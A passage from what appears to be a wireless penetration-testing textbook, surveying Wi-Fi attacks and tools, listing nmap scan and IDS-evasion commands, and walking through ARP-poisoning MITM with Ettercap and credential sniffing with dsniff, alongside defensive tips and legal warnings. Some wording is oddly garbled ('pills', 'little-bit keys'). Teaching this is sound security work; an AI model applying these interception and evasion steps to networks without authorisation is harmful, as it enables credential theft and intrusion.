A MAC spoofing attack is where the intruder sniffs the network for valid MAC addresses and attempts to act as one of the valid MAC addresses where the attacker has full network access through the wireless access point. This type of assault is popular at paid hotspots such as hotels, airports, coffee shops, and other paid Internet venues. The MAC spoofing attack is depicted in *[Figure 2.5](#c02.xhtml#fig2_5)*:

![](images/Figure-2.5.jpg)

**Figure 2.5:** MAC spoofing

# [802.11 RADIUS cracking](#toc.xhtml#s27a)

Although we do not hear much about this attack, it is an essential topic to discuss. In this assault, the attacker uses brute force to obtain a **Remote Authentication Dial-In User Service** (**RADIUS**) secret from an 802.11 access request for malevolent purposes. On a LAN network between the AP and a RADIUS server, any packet capture tool will work. Because many APs, servers, and even software services will ask for a RADIUS login, it is quite risky. The attacker can acquire access to anything that requires RADIUS to approve access if RADIUS is compromised. This assault is depicted in *[Figure 2.6](#c02.xhtml#fig2_6):*

![](images/Figure-2.6.jpg)

**Figure 2.6:** 802.11 RADIUS cracking

# [Confidential attacks](#toc.xhtml#s28a)

These attacks try to intercept private data transferred over wireless networks, whether it is sent in clear text or encrypted using 802.11 or higher layer protocols.

The following sections discuss various private attacks.

# [Eavesdropping](#toc.xhtml#s29a)

Of course, we all understand what eavesdropping is, but do you understand what it implies in terms of security? When it comes to computer security, eavesdropping means capturing data, decoding it, and then obtaining potentially sensitive information. It is the same as listening to it on a phone call. You listen to the talk, record it, and then extract potentially sensitive information from it. Ettercap, Kismet, and Wireshark are all capable of this. The attack is depicted in *Figure* *2.7*:

![](images/Figure-2.7.jpg)

**Figure 2.7:** Eavesdropping

# [WEP key cracking](#toc.xhtml#s30a)

It is finally time to talk about WEP cracking! It is exactly what it sounds like: using passive or active methods to capture data to recover a WEP key. WEP encryption can now be hacked in less than 5 minutes with today’s improved hardware and software! WEP encryption should only be used if the old gear is still in use; otherwise, WPA2 encryption should be utilized. These attacks can be carried out using tools such as Aircrack-ng, AirSnort, Airoway, chopchop, and dwepcrack. An example of WEP key cracking is seen in *Figure* *2.8*:

![](images/Figure-2.8.jpg)

**Figure 2.8:** WEP Key cracking

# [Evil twin AP](#toc.xhtml#s31a)

Have you ever heard of an AP with an evil twin? A rogue access point is like an evil twin AP. To trick consumers into thinking it is a trusted wireless network, the attacker establishes a fake wireless AP. Because the beacons are faster and closer in range, they intensify their signal to the point where the client will instantly connect to them. The most common evil twin attack scenario you may come across in the wild is one with Captive Portals such as Starbucks, Airport, and Hotels where These attacks can be carried out via Honeypot, CqureAP, D-Link G200, HermesAP, Rogue Squadron, and WifiBSD. The following image depicts a common tool, as shown in *[Figure 2.9](#c02.xhtml#fig2_9):*

![](images/Figure-2.9.jpg)

**Figure 2.9:** Evil twin AP

# [AP phishing](#toc.xhtml#s32a)

To phish for logins, bank accounts, and credit card details, the attacker operates a phony Web portal or Web server on a false AP. Because ordinary users will not see the attack happening to them, this is by far one of the most hazardous and frightening attacks to encounter. They will think it is the actual website, but the attacker is merely waiting for them to check in so he can steal their data on the other side. These attacks can be carried out with tools such as Airpwn, Airsnarf, Hotspotter, Karma, and RGlueAP, as shown in *[Figure 2.10](#c02.xhtml#fig2_10):*

![](images/Figure-2.10.jpg)

**Figure 2.10:** AP phishing

# [Man-in-the-middle attack](#toc.xhtml#s33a)

You might have heard of this attack tactic before; if you have not, you will now! An attacker intercepts network traffic between you and another target in a man-in-the-middle attack. On a wired or wireless network, the attacker might get usernames and passwords, examine e-mails, view HTTP sessions of websites, and much more. These attacks can be carried out with tools such as dsniff, Ettercap-NG, and sshmitm. This attack is depicted in *Figure* *2.11*:

![](images/Figure-2.11.jpg)

**Figure 2.11:** MITM attack

# [Credential attacks](#toc.xhtml#s34a)

Have you ever heard of or dealt with a person whose online accounts were hacked? Most likely, this user has been a victim of a credential attack in which an attacker has stolen their login credentials. This can be accomplished with the use of a Web server or tools such as the **Social Engineering Toolkit** (**SET**). The attacker can clone a website and make it appear genuine and reputable to fool the user into signing in. They have no idea that someone suddenly has complete access to their data. The credential harvester and phishing attack methods will be discussed in the following sections.

# [Credential harvester](#toc.xhtml#s35a)

This technique launches an Apache server on the attacker’s PC to clone a website and make it appear authentic. The attacker might connect to a wireless access point and use DNS spoofing to send HTTP requests to a bogus website. The website will appear to be the same as the real website when the user tries to log in normally. On the attacker’s end, the attacker will have access to the user’s username and password, as well as the user’s IP address. From here, the attacker could continue collecting account logins, which he or she could subsequently save in a report. It is critical to conduct social engineering assaults on your company’s employees to see if they follow processes and security standards. This can be seen in *Figure* *2.12*:

![](images/Figure-2.12.jpg)

**Figure 2.12:** Credential harvester

# [Phishing](#toc.xhtml#s36a)

So, what exactly is phishing, and how do we spot a phishing attempt, a fraud, or a hoax? Phishing is a deceptive method of obtaining personal information such as usernames, passwords, social security numbers, phone numbers, and credit card numbers. These assaults are frequently detected by sending an e-mail to a user instructing them to visit a website for information updates, password changes, or information verification. The easiest approach to avoid being a victim of a phishing scam is to understand how they work. An e-mail from an unknown source requesting your password or changing your password is most likely a fraudulent e-mail. These e-mails will need to be blocked or marked as spam or phishing. If you suspect you have been a victim of phishing, update your passwords, as shown in *[Figure 2.13](#c02.xhtml#fig2_13)*:

![](images/Figure-2.13.jpg)

**Figure 2.13:** Phishing

# [Authentication attacks](#toc.xhtml#s37a)

Authentication attacks are used by attackers to steal valid user identities and credentials to gain access to private networks and services. The following sections describe some authentication attacks.

# [Shared key guessing](#toc.xhtml#s38a)

Using vendor default credentials or shared key generators, the attacker tries to guess 802.11 shared key authentications. All shared keys should not be left as defaults and should be changed as soon as the device is set up and configured. This attack can be carried out using any cracking tool, such as Aircrack-ng, as shown in *Figure* *2.14*:

![](images/Figure-2.14.jpg)

**Figure 2.14:** Shared key guessing

# [PSK cracking](#toc.xhtml#s39a)

Using a dictionary attack tool, the PSK cracking technique recovers a WPA/WPA2 PSK from collected key handshake frames. The encryption strength of the WPA/WPA2 key is crucial in this attack. If the key is extremely difficult to crack, it could take weeks, which may not be worth a hacker’s time. When making your own passwords, use a combination of letters, numbers, and symbols. The more characters you have, the less likely you are to become a target. These attacks can be carried out with tools such as coWPAtty, genpmk, KisMAC, and wpa\_crack. A PSK cracking attack is depicted in *Figure* *2.15*:

![](images/Figure-2.15.jpg)

**Figure 2.15:** PSK cracking

# [Sniffing application credentials](#toc.xhtml#s40a)

The attacker collects user credentials such as e-mail addresses and passwords from clear text application protocols when sniffing for application credentials. This is rare to happen on major websites since many are using HTTPS; nonetheless, when login onto wireless routers or access points, HTTP is generally used, which is unencrypted clear text. If you use the HTTP protocol to sign in, the attacker has easy access to your username and password. These attacks can be carried out with tools such as Ace Password Sniffer, dsniff, PHoss, and Win Sniffer, as shown in *[Figure 2.16](#c02.xhtml#fig2_16):*

![](images/Figure-2.16.jpg)

**Figure 2.16:** Sniffing

# [Cracking domain accounts](#toc.xhtml#s41a)

When using a brute-force or dictionary attack tool to crack domain accounts, the attacker recovers the user’s credentials, such as their Windows login and password, by cracking the NetBIOS password hashes. Some programs require browser-saved passwords from internet Explorer, Firefox, or Google Chrome. If an attacker obtains your credentials, they may be able to access network shares, send and receive e-mails, and potentially compromise the entire domain if the account has administrative privileges. These attacks can be carried out with tools such as John the Ripper, L0phtCrack, and Cain, as shown in *[Figure 2.17](#c02.xhtml#fig2_17):*

![](images/Figure-2.17.jpg)

**Figure 2.17:** John the Ripper

# [VPN login cracking](#toc.xhtml#s42a)

The attacker uses a brute-force attack on the VPN authentication protocols to obtain user credentials such as PPTP or IPsec passwords. Make sure the password and the pre-shared secret key are both unique and extremely secure. Passwords or numbers that are easy to guess can easily compromise a whole organization, resulting in consumer information being disclosed. These attacks can be carried out using tools such as IKE-scan, IKECrack, anger, and THC-pptp-bruter. The VPN login cracking attack is shown in *[Figure 2.18](#c02.xhtml#fig2_18)*:

![](images/Figure-2.18.jpg)

**Figure 2.18:** IKE-scan

# [802.11 identify theft](#toc.xhtml#s43a)

The attacker collects user profiles from the clear text over wireless 802.11 in an 802.11 identity theft attack. Encryption is essential for ensuring that no data is compromised. While connected to a Wi-Fi network, using HTTPS and VPN protocols will help protect you from assaults such as this. This can be done with capture tools such as Wireshark or Ettercap-NG, as shown in *Figure* *2.19*:

![](images/Figure-2.19.jpg)

**Figure 2.19:** Stealing password using Wireshark

# [802.11 password guessing](#toc.xhtml#s44a)

An 802.11 password-guessing attack uses a captured identity to attempt to guess the user’s password on 802.11 authentications repeatedly. The attacker is likely to keep guessing default passwords, vendor names, most common passwords, birthdays, names, phone numbers, and other personal information until they have complete control of the wireless network. If the attacker has a large password dictionary, a dictionary attack can be readily carried out, and access gained in a few hours. These attacks can be carried out with tools such as John the Ripper and THC Hydra, as shown in *Figure* *2.20*:

![](images/Figure-2.20.jpg)

**Figure 2.20:** THC Hydra

# [802.11 LEAP cracking](#toc.xhtml#s45a)

The attacker recovers user credentials from recorded 802.11 LEAP packets using a dictionary attack tool to crack the NT password hash in an 802.11 LEAP cracking attempt. This is dependent on the strength of the password; if it is strong, it is unlikely to be cracked, which is why it is critical to use a combination of letters, numbers, and symbols to avoid dictionary attacks. These attacks can be carried out with tools such as Anwrap, Asleap, and THC-LEAPcracker. *[Figure 2.21](#c02.xhtml#fig2_21)* serves as an example:

![](images/Figure-2.21.jpg)

**Figure 2.21:** Asleap

# [802.11 EAP downgrade attack](#toc.xhtml#s46a)

EAP is required by 802.11 to deliver communications between the connecting user and the authentication. If an attacker can place oneself between the client and the authentication, the person connecting to the network is connected. Using falsified EAP-Response/NAK packets, the attacker compels a wireless 802.11 device or server to offer a lower type of authentication. Because the authentication is so poor, the attacker can acquire access in a matter of minutes. These attacks can be carried out using tools such as File2air and libradiate. *[Figure 2.22](#c02.xhtml#fig2_22)* serves as an example:

![](images/Figure-2.22.jpg)

**Figure 2.22:** File2air

# [Conclusion](#toc.xhtml#s47a)

Several potential attack methods that can be employed over wireless were explored. Access control attacks, confidential attacks, credential attacks, and authentication attacks. We created a complete understanding of the user’s possible risks.

We will go through how to scan wireless networks for information in the upcoming chapter, as well as different wireless scanning methods and how they can be used for both good and bad.

# [Questions](#toc.xhtml#s48a)

1.  Mention the most famous access control attacks.
2.  Mention the most famous of confidential attacks.
3.  Mention the most famous of credential attacks.
4.  Mention the most famous of authentication attacks.

# [CHAPTER 3](#toc.xhtml#c03)

# [Wireless Information Gathering and Footprinting](#toc.xhtml#c03)

# [Introduction](#toc.xhtml#s49a)

We hope you enjoyed reading the previous chapter and found it instructive, as it contained a wealth of information. In this chapter, we will discuss how to scan wireless networks for information, as well as several wireless scanning technologies and how they can be used for both good and negative purposes.

You can ask or start wondering how difficult it is to scan for wireless networks. That is something that everybody can do! Yes, but what if the SSID is not visible? Are you able to find hidden wireless networks? The average user is unlikely to be aware of the existence of concealed wireless networks.

You might also wonder why a hidden wireless network is so necessary. You may believe that keeping your identity hidden from others is a useful security precaution. Yes, it certainly is! Hidden wireless networks, however, can be used for harmful and other illicit purposes.

Consider the following scenario: you are a security consultant for a company. Some files are missing or have been modified after business hours by a user who does not have physical access after office hours or remote access, according to a co-worker. You check the timestamps of the updated files and the files that were deleted after 2 a.m. and the name of the user who logged in and performed the changes. This user now claims that they did nothing wrong. Your co-worker tells you later that day that they witnessed the user put up a wireless access point or router in their cubicle. You inquire with your employer about the possibility of searching the user’s workspace due to a security concern. After exploring the area, you discover a Wi-Fi access point installed beneath the desk. This is clearly not a good situation! Anyone can now connect to the company’s network and access network shares and servers from anywhere within a wireless range.

# [Structure](#toc.xhtml#s50a)

In this chapter, we will discuss the following topics:

*   Footprinting
*   Wireless network discovery
*   Wireless scanning
*   Sniffing wireless networks
*   Identifying your targets
*   Protecting yourself from attacks

# [Objectives](#toc.xhtml#s51a)

You will learn how to scan wireless networks for information in this chapter, as well as see two different forms of wireless scanning and how they function. You will also learn how to use Ettercap to sniff wireless networks using ARP poisoning and how to use dsniff to gather login details. During a wireless penetration test, you will also be able to identify your targets. Finally, you will learn a variety of ways to defend yourself against these attacks.

# [Footprinting](#toc.xhtml#s52a)

Footprinting is the process of gathering information about a client’s network to construct a profile based on the data. It is critical that the attacker obtains information from the organization in a secure and professional manner without disclosing any confidential information.

Footprinting normally entails two stages of reconnaissance. The first stage is to obtain data from the target to define the network range’s scope. The following are the most used tools for this:

*   Nslookup
*   Whois

In the next stage, you should collect the following information:

*   Contact names, phone numbers, and e-mail addresses
*   Each location and branch office
*   Company security policies

Sending an e-mail or calling one of the employees and undertaking a social engineering method to determine how much information they are prepared to share would yield even better results. Then, look at the areas where security awareness training may be better.

# [Wireless network discovery](#toc.xhtml#s53a)

The best network applications recommended by network and security administrators will be covered in the next section. These tools can detect rogue hardware, software license violations, and even outages or performance concerns. The applications we selected are diverse and dependable. Even though we will only discuss two network discovery tools, we will provide some additional applications that we believe will benefit you and your company.

# [Nmap](#toc.xhtml#s54a)

**Network Mapper (Nmap)** is a well-known port scanner and network discovery tool. It is compatible with all major operating systems. *[Figure 3.1](#c03.xhtml#fig3_1)* serves as an example:

![](images/Figure-3.1.jpg)

**Figure 3.1:** Nmap

Please visit **[https://nmap.org/](https://nmap.org/)** for more information on Nmap.

# [Nmap commands](#toc.xhtml#s55a)

Nmap has a lot of command choices, and we might not recall all of them off the top of our heads. In the end, it is all about knowing your commands and which ones to use in which scenarios. As a pentester, you will need to be able to use most of these tools effectively. The following are some examples of them:

*   **Operating system and version detection:** As illustrated in *[Figure 3.2](#c03.xhtml#fig3_2)*, these commands will return results for the operating system and software versions: 
    
    ![](images/Figure-3.2.jpg)
    
    **Figure 3.2:** Nmap -A command
    
    The following are some commands:
    
    *   `nmap -A 192.168.1.7`: The operating system, service versions, and traceroute results will all be displayed with this command.
    *   `nmap -v -A 192.168.1.`7: During the scan, this command will display more detailed information, including the operating system, service versions, and traceroute output.
    *   `nmap -O 192.168.1.7`: Only the operating system will be displayed with this command, as shown in *[Figure 3.3](#c03.xhtml#fig3_3):*
        
        ![](images/Figure-3.3.jpg)
        
        **Figure 3.3:** Nmap -O command
        
    *   If you use `–osscan-guess`, the scan will guess more aggressively, as shown in *[Figure 3.4](#c03.xhtml#fig3_4):*
        
        ![](images/Figure-3.4.jpg)
        
        **Figure 3.4:** Nmap -O -osscan-guess command
        
    *   `nmap -A -iL /tmp/hosts.txt`: This command will look for the operating system and service version information, as well as do a traceroute. The text file will then be used to input a list of hosts or networks, as shown in *[Figure 3.5](#c03.xhtml#fig3_5):*
        
        ![](images/Figure-3.5.jpg)
        
        **Figure 3.5:** hosts.txt
        
        Refer to *[Figure 3.6](#c03.xhtml#fig3_6)*:
        
        ![](images/Figure-3.6.jpg)
        
        **Figure 3.6:** Nmap -A -iL command
        
*   **Service scan:** These commands will display information about the host’s services and ports, as well as whether the host or network is protected by a firewall. *[Figure 3.7](#c03.xhtml#fig3_7)* shows this: 
    
    ![](images/Figure-3.7.jpg)
    
    **Figure 3.7:** Nmap -sV command
    
    The following are some commands:
    
    *   `nmap -sV 192.168.1.7`: This command will look for open ports to see what services and versions are currently available.
    *   `nmap -sA 192.168.1.7`: This command is used to do a policy scan on the firewall. It will show whether the firewall is simply a packet filter that is blocking SYN packets. It sends an ACK packet to the destination; if it receives a response, it is open; if it does not receive a response, it is running a packet filter, as shown in *[Figure 3.8](#c03.xhtml#fig3_8):*
        
        ![](images/Figure-3.8.jpg)
        
        **Figure 3.8:** Nmap -sA command
        
*   **Bypassing firewall filters**: This command can be used to scan a firewall-protected host or network. This command is also affected by the firewall filters in use. *[Figure 3.9](#c03.xhtml#fig3_9)* demonstrates the technique: 
    
    ![](images/Figure-3.9.jpg)
    
    **Figure 3.9:** Nmap -PN command
    
    The following are some commands:
    
    *   `nmap -PN 192.168.1.7`: The host will be scanned as though it were online with this command. If you cannot access a host using ping or scan, this can be useful.
    *   `nmap -PS 192.168.1.7`: This command does a TCP SYN discovery scan on the specified ports.
    *   `nmap -PA 192.168.1.7`: This command will do an ACK discovery scan against the specified ports.
*   **Scanning for firewall vulnerabilities:** These commands will look for typical firewall exploits that rely on a flaw in the TCP network protocol being discovered, as shown in *[Figure 3.10](#c03.xhtml#fig3_10)*: 
    
    ![](images/Figure-3.10.jpg)
    
    **Figure 3.10:** Nmap -sN command
    
    The following are some commands:
    
    *   `nmap -sN 192.168.1.7`: This is a null scan command. Because the null scan sets no bits, it can be used to get around a non-stateful firewall and packet filter.
    *   `nmap -sF 192.168.1.7`: This is a FIN scan command. Only the TCP FIN bit will be set by the FIN scan. When a FIN packet is sent to an open port, the open port simply ignores it, whereas the closed port is redirected to an RST packet, which, in turn, reveals which ports are open and closed in Nmap.
    *   `nmap -sX 192.168.1.7`: This is an Xmus scan command. The Xmus scan can be used to see if a target machine’s ports are open or closed. This scan transmits TCP segments with all the packet header flags.
*   **Packet fragments:** To make it more difficult for packet filters, intrusion detection systems, and firewalls to identify your scan, this command separates the TCP header into many packets. If you want to execute a stealth scan on a network without raising a flag, you will need these commands. As an example, consider *[Figure 3.11](#c03.xhtml#fig3_11)*:  
    *   `Nmap -sS -p 80 -f 192.168.1.7`: This command does a TCP SYN scan on `192.168.1.7` port `80` without triggering any intrusion detection systems or alarms. Please keep in mind that the setup and policies of the firewall or IDS also play a role. 
        
        ![](images/Figure-3.11.jpg)
        
        **Figure 3.11:** Packet fragment command
        
*   **Firewall decoys**: You can use this command to spoof a host to a remote host. An IDS and network administration will be completely ignorant that a network scan is taking place if the spoofing is done correctly. A sample command is as follows:  
    *   `Nmap -n 192.168.1.7 -D 192.168.1.110`: This command scans a host without issuing a DNS request, and it also includes a decoy set for `192.168.1.110`, which makes it appear as if the scan is being conducted by `192.168.1.110` rather than the Kali Linux host. Refer to *[Figure 3.12](#c03.xhtml#fig3_12):* 
        
        ![](images/Figure-3.12.jpg)
        
        **Figure 3.12:** Firewall decoys command
        

# [Zenmap](#toc.xhtml#s56a)

**Zenmap** is a graphical frontend for Nmap that runs on multiple platforms. It simplifies the use of Nmap and includes prepared instructions for running scans on the fly.

Refer to *[Figure 3.13](#c03.xhtml#fig3_13):*

![](images/Figure-3.13.jpg)

**Figure 3.13:** Zenmap  
Please visit **[https://nmap.org/zenmap/](https://nmap.org/zenmap/)** for more information on Zenmap.

# [Wireless scanning](#toc.xhtml#s57a)

Wireless access points are always looking for more wireless access points to connect. 802.11 radios operate at frequencies ranging from 2.4 to 5.85 GHz. **Passive** and **active** scanning are the only two approaches available. 802.11 radios, by default, execute both scans on all channels authorized by the country’s operating laws.

The penalty for operating without an FCC permit or license could result in a significant fee even for a single day of operation. You might wonder who the FCC is. The **Federal Communications Commission** (**FCC**) oversees overseeing and regulating the US telecommunications industry, which includes the internet. Why might this be a cause for concern? The purpose of the internet is for everyone to have access to it without discrimination, blocking, censorship, or network throttling. To recapitulate, the FCC is proposing new internet laws and contracts that will allow internet service providers to charge a premium or sell a *paid-to-use* service that will slow down your internet if you do not have the extra cash. Before doing any local broadcasts or scans, please consult your country’s wireless communication team.

# [Passive scanning](#toc.xhtml#s58a)

During a **passive scan**, beacons and probe responses are monitored. The client’s radio transmits a once-per-second scan and then audits the packets on the wireless network. Because passive scans are used to connect clients to access points, they are always enabled.

# [Active scanning](#toc.xhtml#s59a)

Only channels that are approved by government rules are actively scanned. **Active scanning** is enabled by default; however, it can be removed from the profile or settings of the wireless adapter. During an active scan, the radio sends probe requests to other devices in the area with a null SSID name to encourage probe answers. In other words, access points actively seek out and listen to other devices, as shown in *[Figure 3.14](#c03.xhtml#fig3_14):*

![](images/Figure-3.14.jpg)

**Figure 3.14:** Active scanning

# [How does scanning work?](#toc.xhtml#s60a)

The access point must change channels to scan outside the range of operation. These wireless RF channel scans from the access point occur once every second and at various channel ranges until all the channels have been cycled through, as shown in *[Figure 3.15](#c03.xhtml#fig3_15)*:

![](images/Figure-3.15.jpg)

**Figure 3.15:** RF channels

After roughly 25–30 milliseconds, the wireless access point will quit the RF channel. Scans are timed to avoid interfering with the transmissions of other beacons. After the channel shift is complete, the probes are dispatched. Keep in mind that if speech, video, or other significant data usage is detected, the scan frequency will be lowered.

# [Sniffing wireless networks](#toc.xhtml#s61a)

Can we really smell wireless networks? Sounds funny, right? No, but with the correct tools and equipment, you can! Wireless sniffing is an eavesdropping technique used on a wireless network by programs or tools. Wireless, which stumbles around networks, is less intrusive than sniffing. Wireless sniffing is used to diagnose network problems and protocols on a wireless network.

Connections, both wireless and wired, can be monitored and sniffed. Because wireless networks communicate via radio signals, sniffing them is significantly easier. An attacker could sit in a car outside a business and sniff a wireless network for sensitive information that he or she could use for personal advantage, attention, or money.

Frames are small bits and pieces of information that are divided into small bits and pieces by networks. Data packets are contained within these frames. Frames, packets, or both could be targeted by an attacker.

An attacker could use frames to detect concealed wireless networks in the region and get unauthorized access if the networks are not following the most up-to-date wireless encryption standards. These approaches are used by network administrators to debug network faults.

# [The Wireshark application](#toc.xhtml#s62a)

Wireshark is a packet analyzer that is both free and open source. It is used to troubleshoot and analyze networks. It captures and displays network packets in detail. Wireshark is used by network and security managers to diagnose network and security issues.

Years ago, there were a variety of tools accessible, all of which were somewhat costly to use. Wireshark has changed that by making itself available to the public for free. Wireshark is one of the most powerful open-source packet analyzers currently available.

Wireshark has several uses. It will be used by network administrators to discover and troubleshoot network issues. Security issues can be investigated by network security engineers. Protocol implementations can be debugged by developers. Users can gain a good understanding of how network protocols work and how an attacker could potentially compromise them.

Wireshark is particularly useful in the real world for viewing real-time packets to diagnose Web application issues, authentication concerns like a three-way TCP handshake, and auditing. Wireshark will tell you where the packets came from, where they are going, and what they are for.

You could, for example, see if one user is using more network traffic than others. During business hours, this user could be downloading or watching YouTube videos in large quantities. You can reduce that user’s bandwidth so that the network is not slowed down for everyone else.

Wireshark is a network protocol analyzer that runs on Windows, Mac OS X, and Linux. For more information on features and support, go to **[https://www.wireshark.org/](https://www.wireshark.org/)**. Wireshark is preinstalled on Kali Linux, so you will not have to install it. However, you may need to install it on whatever operating system you desire. There are other network protocol analyzer tools such as SolarWinds deep packet inspection and Analysis tool, Net flow analyzer, and PRTG Network Monitor.

# [Ettercap](#toc.xhtml#s63a)

Ettercap engages in man-in-the-middle attacks to impersonate a router or server.

Ettercap could be used by an attacker for the following purposes:

*   To manipulate data
*   To gather passwords for protocols such as FTP, HTTP, POP, and SSHv1
*   To fake SSL certificate in HTTPS sessions

Following ARP spoofing, we will position our Kali Linux system as the *man-in-the-middle* in this Ettercap demonstration. Let us get started!

1.  Open a bash terminal and type `ettercap –G:` to launch Ettercap in graphical mode, as shown in *[Figure 3.16](#c03.xhtml#fig3_16)*. Select `Primary Interface` `wlan0`, then accept the setting: 
    
    ![](images/Figure-3.16.jpg)
    
    **Figure 3.16:** Ettercap
    
2.  Select `Hosts`, then `Scan` for hosts from the drop-down menu, as shown in *[Figure 3.17](#c03.xhtml#fig3_17)*: 
    
    ![](images/Figure-3.17.jpg)
    
    **Figure 3.17:** Scan for hosts
    
3.  Click on `Hosts`, then on the `Hosts` list, as shown in *[Figure 3.18](#c03.xhtml#fig3_18):*
    
    ![](images/Figure-3.18.jpg)
    
    **Figure 3.18:** Host list
    
4.  Add to `Target 1` after selecting the router’s IP address. Select another IP address from the list and click `Add to Target 2` if you want to target another router or server, as shown in *[Figure 3.19](#c03.xhtml#fig3_19):*
    
    ![](images/Figure-3.19.jpg)
    
    **Figure 3.19:** Add targets
    
    If you do not choose anything, the entire subnet will be ARP-poisoned. This should not be executed on a production network! The router we will be using for this example has the IP address `192.168.1.1`.
    
5.  After then, go to Mitm and then ARP poisoning, as shown in *[Figure 3.20](#c03.xhtml#fig3_20):*
    
    ![](images/Figure-3.20.jpg)
    
    **Figure 3.20:** ARP poisoning
    
6.  Check the box Sniff remote connections, as shown in *[Figure 3.21](#c03.xhtml#fig3_21)*: 
    
    ![](images/Figure-3.21.jpg)
    
    **Figure 3.21:** Sniff remote connections
    
7.  Click on `Start` and then click on `Start Sniffing`, as shown in *[Figure 3.22](#c03.xhtml#fig3_22):*
    
    ![](images/Figure-3.22.jpg)
    
    **Figure 3.22:** Start sniffing
    

An attacker only needs to conduct a modified or filtered attack on the subnet now that it has been trapped in a man-in-the-middle attack. These filters can be used with Ettercap’s plugins or constructed from scratch. Common attacks such as DNS spoofing, FTP prompt changes, and SSH downgrade attacks occur here. The end-user will be completely unaware of the situation. Wireshark can be used by a network administrator to figure out where the packets are coming from and track down the attacker’s IP address. Do not use default or automatic security settings as a rule. Enforce the greatest level of security possible and educate employees on security best practices.

# [dsniff](#toc.xhtml#s64a)

dsniff is a powerful password sniffer that can detect a wide range of network protocols, including Telnet, FTP, SMTP, POP3, IMAP, HTTP, CVS, Citrix, SMB, Oracle, and many others. Although Wireshark can reveal a great deal about packets, dsniff can reveal usernames and passwords. You can choose the interface to listen on and save the results to a file format that you can read later. Let us look at a few examples of how to use dsniff, as shown in *[Figure 3.23](#c03.xhtml#fig3_23)*:

![](images/Figure-3.23.jpg)

**Figure 3.23:** dsniff tool

Perform the following steps:

1.  Open a new Terminal window.
2.  Type the following command: `dsniff -i wlan0`. Option `-i` is the network interface where we selected `wlan0`, as shown in *[Figure 3.24](#c03.xhtml#fig3_24)*: 
    
    ![](images/Figure-3.24.jpg)
    
    **Figure 3.24:** dsniff -i wlan0 command
    
3.  Sign in with an account for just about any of the system protocols mentioned earlier, as shown in *[Figure 3.25](#c03.xhtml#fig3_25)*: 
    
    ![](images/Figure-3.25.jpg)
    
    **Figure 3.25:** FTP protocol
    
4.  If you appear back at some other terminal, you should note that dsniff has exposed your login credentials, as shown in *[Figure 3.26](#c03.xhtml#fig3_26)*: 
    
    ![](images/Figure-3.26.jpg)
    
    **Figure 3.26:** dsniff output
    

If anyone should sign in making use of no encryption, dsniff will grab login credentials. For this reason, it is highly recommended to always use encryption when it is available to an individual. Please make sure you are using the most recent TLS standard and a fantastic security certificate with 2,048+ little-bit keys. If, however, you become configuring a server, change the default slot to something distinctive. This can help reduce the number of potential assaults and any security risks that are probably obtainable in the wild.

Suppose you wished to sniff the remote pc for passwords on the neighborhood LAN using dsniff? Certainly, no problem! There exists a device called arpspoof that may enable you to spoof your attacking personal computer IP address to become a default gateway or man-in-the-middle attack. Because of this attack to function, you need to enable IP routing for the computer to effectively establish the correct communication between both computer systems.

# [Identifying your targets](#toc.xhtml#s65a)

As a penetration tester, it is important to understand and understand who your goals are. There exist many more than just computer systems to consider. Servers, smartphones, pills, and network hardware may also be a section of the penetration check. Knowing whether software programs or program patches have already been applied or not really is extremely important once we would not like unauthorized access to the unit and systems, specifically in a production atmosphere.

Tools like Nmap and Zenmap may be used to scan a whole network. Even though it is a quick solution to get information like the operating system and software edition, it is not always accurate. Based on the scenario, it is sometimes better to go to each gadget and system to learn what is used on the network. Inquiring the client for system documentation and hardware stock can be very useful if they can offer that information.

# [Protecting yourself from attacks](#toc.xhtml#s66a)

No issue what the problem is; we always have to know how exactly to protect ourselves from any threats that could occur. Whether it is from within or beyond your network, you will have to provide yourself with knowing how you might be affected by an individual or company. There are several solutions to protect yourself from like attacks:

*   Protection against Nmap and Zenmap:  
    *   Create custom firewall rules and access list
    *   Any hardware IDS that are monitoring network traffic 24/7
    *   Block or filter ICMP pings
*   Protection against wireless scanning:  
    *   Configure the latest wireless encryption algorithm
    *   Configure MAC filtering rules
    *   Turn off or hide wireless broadcast
    *   Turn off UPnP support
*   Protection against sniffing wireless networks:  
    *   Use SSH and HTTPS instead of Telnet and HTTP
    *   Connect using a VPN service
    *   Connect to only trusted wireless networks

# [Conclusion](#toc.xhtml#s67a)

In this chapter, you discovered how exactly to scan wireless systems for info, saw two various kinds of wireless scanning, and discovered how they function. You saw how exactly to sniff wireless systems by ARP poisoning with Ettercap and how exactly to use dsniff to get login credentials. We furthermore discussed how to determine your targets throughout a wireless penetration test.

Finally, you learned a number of different solutions to protect yourself from these assaults. It is very important to keep your mindset of being an attacker since it will open up your eye to even more security threats that could potentially threaten you to be an individual or company. Always hook up to trusted wireless systems, use encryption when it is available, and make use of a VPN when traveling.

Now, you are ready to move on to *[Chapter 4, Wireless Vulnerability Research](#c04.xhtml).*

# [Questions](#toc.xhtml#s68a)

1.  What is Footprinting?
2.  Mention the most famous of wireless network discovery tools.
3.  What are the types of wireless scanning?
4.  How do you protect yourself from wireless scanning?
5.  Mention the common tools of Network Protocol Analyzer.

# [CHAPTER 4](#toc.xhtml#c04)

# [Wireless Vulnerability Research](#toc.xhtml#c04)

# [Introduction](#toc.xhtml#s69a)

In this chapter, you become familiar with how to strategy an attack and crack WEP/WPA/WPA2 wireless networks and can learn Mac spoofing to get unauthorized access to a network. Additionally, you will learn to protect yourself from most of these threats. This chapter could have hands-on, step-by-step guidelines with Kali Linux. Remember that you will just be able to adhere to the cracking portion of this chapter in case you have the cellular cards or adapters pointed out towards the finish of *[Chapter 1, Wireless Penetration Testing Lab Setup](#c01.xhtml)*.

Before we start, there are some things that you need to know before we crack any wireless networks:

*   Cracking any wireless system without authorization is illegal
*   If you are captured without authorization, you will face the consequences in accordance with the law inside your area
*   Please only demonstrate methods by your own network

# [Structure](#toc.xhtml#s70a)

In this chapter, we will discuss the following topics:

*   Planning an attack
*   Wireless password cracking
*   Spoofing your MAC address
*   Protecting yourself from attacks

# [Objectives](#toc.xhtml#s71a)

In this chapter, you will learn how to put a plan for an attack. Next, you will learn several methods for an attack. Then, you will learn detailed information on WEP, WPA, and WPA2 encryption. Finally, you will learn several ways to reduce the risk of a wireless attack.

# [Planning an attack](#toc.xhtml#s72a)

Before we work on any wireless scans or cracks in any wireless encryption, the very first thing we must do is plan an attack. We must make sure we have everything to run a wireless penetration and ensure that we ask ourselves as many questions as possible so that we do not come across any obstacles along the way. Let us start with a listing of requirements and the steps we shall get to crack a wireless network.

# [Wireless attack](#toc.xhtml#s73a)

Right here, we have a listing of what is necessary to conduct a complete wireless attack:

*   **A compatible wireless adapter**: Note that it must support packet injection.
